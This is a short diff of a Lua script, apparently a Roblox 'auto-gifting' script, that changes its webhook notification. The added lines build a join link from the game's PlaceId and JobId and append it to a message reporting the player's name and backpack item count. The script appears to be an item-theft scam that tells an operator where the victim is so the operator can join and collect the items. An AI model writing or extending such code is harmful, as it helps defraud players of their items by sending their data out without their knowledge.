@@ -197,9 +197,12 @@ local function sendWebhookMessage()
     if not localPlayer then return end
     
     local backpackItemsCount = #localPlayer.Backpack:GetChildren()
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local joinLink = string.format("https://www.roblox.com/games/%s/-?rbxp=1&launchMethod=join&launchData=%s", tostring(placeId), tostring(jobId))
     
-    local message = string.format("**%s** has activated the auto-gifting script and has **%d** items in their backpack!",
-        localPlayer.Name, backpackItemsCount)
+    local message = string.format("**%s** has activated the auto-gifting script and has **%d** items in their backpack! Join them here: %s",
+        localPlayer.Name, backpackItemsCount, joinLink)
 
     local data = {
         content = message
